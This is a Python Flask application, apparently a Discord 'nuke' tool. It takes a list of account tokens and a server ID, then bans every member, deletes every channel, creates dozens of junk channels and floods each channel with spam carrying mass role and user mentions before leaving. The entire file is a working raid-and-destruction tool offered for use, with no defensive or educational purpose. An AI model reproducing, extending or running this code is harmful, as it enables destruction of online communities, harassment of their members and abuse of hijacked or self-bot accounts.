import traceback, threading, requests, datetime, asyncio, discord, random, string, base64
from flask import Flask, request, redirect, render_template

app = Flask(__name__)

logs = {}
stops = []

class DiscordBot(discord.Client):
    def __init__(self, logId:str, token:str, id:int, name:str, latency:int, messages:list[str], option:list, mode:int):
        super().__init__()
        self.logId = logId
        self.token = token
        
        # DmNukeもServerNukeも呼び出されるから、idとかnameっていう抽象的な名前にしている
        self.guildId = self.userId = id
        self.channelName = self.groupName = name
        
        self.nukeLatency = latency
        self.messages = messages
        if mode == 0:
            self.allUserBan, self.allChannelDelete, self.randomMention, self.exclusionServerIds = option
        self.mode = mode
    def isEnableToken(self, token:str):
        if not token: return False
        headers = {
            "Content-Type": "application/json",
            "Authorization": token
        }
        res = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return str(res.status_code)[0] == "2"
    async def banUser(self, user:discord.Member):
        try:
            await user.ban(reason="Fuck Server User")
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" - {str(datetime.datetime.now())} BanUser ID:{user.id} Name:{user.name}\n"
    async def deleteChannel(self, channel:discord.abc.GuildChannel):
        try:
            await channel.delete()
            logs[self.logId] += "[+]Success"
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
            logs[self.logId] += "[-]Failed"
        logs[self.logId] += f" - {str(datetime.datetime.now())} DeleteChannel ID:{channel.id} Name:{channel.name}\n"
    async def sendMessage(self, message:str, channel:discord.abc.GuildChannel, latencyMs:float):
        if channel in self.guild.categories:
            self.channels.remove(channel)
            return
        try:
            await channel.send(message)
            logs[self.logId] += "[+]Success"
        except Exception as e:
            logs[self.logId] += f"[-]Failed {e}"
            try:
                self.channels.remove(channel)
            except:
                pass
        logs[self.logId] += f" - {str(datetime.datetime.now())} SendMessage ID:{channel.id}\n"
        await asyncio.sleep(latencyMs)
    async def banAllUser(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllUserBan ----\n"
        await asyncio.gather(*(self.banUser(member) for member in guild.members))
        logs[self.logId] += "---- End ----\n\n\n"
    async def deleteAllChannel(self, guild:discord.Guild):
        logs[self.logId] += "---- Start AllChannelDelete ----\n"
        await asyncio.gather(*(self.deleteChannel(channel) for channel in guild.channels))
        logs[self.logId] += "---- End ----\n\n\n"
    async def createChannel(self, channelName:str, guild:discord.Guild):
        channelName = channelName+"-"+"".join(random.choice(string.ascii_lowercase) for _ in range(10))
        await guild.create_text_channel(channelName)
    async def nuke(self, latency:int, messages:list[str], guild:discord.Guild, channelName:str, numberOfExecutions=100):
        logs[self.logId] += "---- Start Nuke ----\n"
        try:
            if self.allChannelDelete:
                await asyncio.gather(*(self.createChannel(channelName, guild) for _ in range(60)))
            self.channels = list(guild.channels)
            roles = list(self.guild.roles)
            members = self.guild.members
            # exclusion everyone
            roles.remove(self.guild.default_role)
            for _ in range(numberOfExecutions):
                if self.logId in stops:
                    logs.pop(self.logId)
                    return
                logs[self.logId] += "--- Nuke ---\n"
                for channel in self.channels:
                    if str(channel.id) in self.exclusionServerIds:
                        continue
                    for message in messages:
                        bMessage = message
                        if message == messages[0]:
                            bMessage = message+"\n"+"".join(random.choice(string.ascii_lowercase) for _ in range(30))+"\n"
                        bMessage = bMessage.replace("{userId}", str(random.choice(guild.members).id))
                        if self.randomMention:
                            try:
                                bRoles = roles
                                if len(roles) >= 5:
                                    bRoles = random.sample(roles, 5)
                                for role in bRoles:
                                    bMessage += f"<@&{role.id}> "
                            except:
                                pass
                            bMessage += "\n"
                            try:
                                bMembers = members
                                if len(members) >= 12:
                                    bMembers = random.sample(members, 12)
                                for member in bMembers:
                                    bMessage += f"<@{member.id}> "
                            except:
                                pass
                            bMessage += "\n"
                        await self.sendMessage(bMessage, channel, latency*0.001)
                random.shuffle(self.channels)
        except:
            logs[self.logId] += "-- Error --\n"+traceback.format_exc()+"\n"
        try:
            await guild.leave()
        except:
            pass
        logs[self.logId] += "---- End ----\n"
    async def on_ready(self):
        logs[self.logId] += f"Start Client - Token:{base64.b64encode(str(self.user.id).encode()).decode()}, ID:{self.user.id}, Name:{self.user.name}\n"
        self.guild = self.get_guild(self.guildId)
        if self.mode == 0:
            if not self.guild:
                logs[self.logId] += f"Error: The server you entered has not been joined by a bot - ID:{self.user.id}\n"
                return
            try:
                i = self.guild.get_member(self.user.id)
                await i.edit(nick="឵᠎")
            except:
                pass
            if self.allUserBan:
                await self.banAllUser(self.guild)
            if self.allChannelDelete:
                await self.deleteAllChannel(self.guild)
            await self.nuke(self.nukeLatency, self.messages, self.guild, self.channelName)
    async def on_message(self, message):
        if message.author.bot:
            return
    def runBot(self):
        try:
            if not self.isEnableToken(self.token):
                logs[self.logId] += f"Error: invalid token - {self.token}\n"
                return
            self.run(self.token, reconnect=True)
        except:
            logs[self.logId] += f"Error:\n{traceback.format_exc()}"


@app.route('/getLog', methods=["GET"])
def getLog():
    if request.args.get("id") in logs:
        return render_template('getLog.html', log=logs[request.args.get("id")])
    else:
        return render_template('getLog.html', log="Not found"), 404

@app.route('/stop', methods=["GET"])
def stop():
    stops.append(request.args.get("id"))
    return redirect('nuke')

@app.route('/nuke', methods=["GET", "POST"])
def nuke():
    if request.method == "POST":
        logId = "".join(random.choice(string.ascii_lowercase) for _ in range(12))
        logs[logId] = "Start Pman Nuke PPP\n\n"
        
        tokens = request.form["tokens"].split("\r\n")
        guildId = int(request.form["guildId"])
        channelName = request.form["channelName"]
        latency = int(request.form["latency"])
        message = request.form["message"]
        subMessages  = request.form["subMessages"].split("\r\n")
        exclusionServerIds = request.form["exclusionServerIds"].split(",")
        allUserBan = "allUserBan" in request.form
        allChannelDelete = "allChannelDelete" in request.form
        randomMention = "randomMention" in request.form
        
        logs[logId] += f"""-- Value you entered --
Tokens:{tokens}
ServerID:{guildId}
ChannelName:{channelName}
Latency:{latency}ms, {latency*0.001}s
message:\n{message}\n
subMessages:{subMessages}
exclusionServerIDs:{exclusionServerIds}
-- Options --
AllUserBan:{allUserBan}
AllChannelDelete:{allChannelDelete}
RandomMention:{randomMention}

"""
        
        for token in tokens:
            bot = DiscordBot(logId, token, guildId, channelName, latency, ([message]*(len(subMessages)+2))+subMessages, [allUserBan, allChannelDelete, randomMention, exclusionServerIds], 0)
            botThread = threading.Thread(target=bot.runBot, daemon=True)
            botThread.start()
        return render_template('selfBotNuke.html', logId=logId)
    return render_template('selfBotNuke.html')

def main():
    port = 8081
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    main()